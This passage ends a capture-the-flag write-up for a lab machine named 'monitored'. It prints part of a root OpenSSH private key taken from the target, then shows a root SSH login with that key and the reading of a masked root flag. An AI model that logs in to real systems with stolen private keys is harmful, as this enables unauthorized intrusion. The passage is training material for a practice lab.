  23   │ /qrvvTewkKNIQkUmCRvBu/vfaUhfO2+GceGB3wN2T8S1DhSYf5ViIIcVIn8JGjw1Ynr/zf
  24   │ FxsZJxc4eKwyvYUJ5fVJZWSyClCzXjZIMYxAvrXSqynQHyBic79BQEBwe1Js6OYr+77AzW
  25   │ 8oC9OPid/Er9bTQcTUbfME9Pjk9DVU/HyT1s2XH9vnw2vZGKHdrC6wwWQjesvjJL4pAAAA
  26   │ wQCEYLJWfBwUhZISUc8IDmfn06Z7sugeX7Ajj4Z/C9Jwt0xMNKdrndVEXBgkxBLcqGmcx7
  27   │ RXsFyepy8HgiXLML1YsjVMgFjibWEXrvniDxy2USn6elG/e3LPok7QBql9RtJOMBOHDGzk
  28   │ ENyOMyMwH6hSCJtVkKnUxt0pWtR3anRe42GRFzOAzHmMpqby1+D3GdilYRcLG7h1b7aTaU
  29   │ BKFb4vaeUaTA0164Wn53N89GQ+VZmllkkLHN1KVlQfszL3FrYAAADBAMuUrIoF7WY55ier
  30   │ 050xuzn9OosgsU0kZuR/CfOcX4v38PMI3ch1IDvFpQoxsPmGMQBpBCzPTux15QtQYcMqM0
  31   │ XVZpstqB4y33pwVWINzpAS1wv+I+VDjlwdOTrO/DJiFsnLuA3wRrlb7jdDKC/DP/I/90bx
  32   │ 1rcSEDG4C2stLwzH9crPdaZozGHXWU03vDZNos3yCMDeKlLKAvaAddWE2R0FJr62CtK60R
  33   │ wL2dRR3DI7+Eo2pDzCk1j9H37YzYHlbwAAAMEAxim0OTlYJOWdpvyb8a84cRLwPa+v4EQC
  34   │ GgSoAmyWM4v1DeRH9HprDVadT+WJDHufgqkWOCW7x1I/K42CempxM1zn1iNOhE2WfmYtnv
  35   │ 2amEWwfnTISDFY/27V7S3tpJLeBl2q40Yd/lRO4g5UOsLQpuVwW82sWDoa7KwglG3F+TIV
  36   │ csj0t36sPw7lp3H1puOKNyiFYCvHHueh8nlMI0TA94RE4SPi3L/NVpLh3f4EYeAbt5z96C
  37   │ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
  38   │ -----END OPENSSH PRIVATE KEY-----
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.248
Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@monitored:~#
```

And we can see the flag:

```bash
root@monitored:~# cat root.txt 
5b****************************ee
```

That's the machine, hope you liked it.
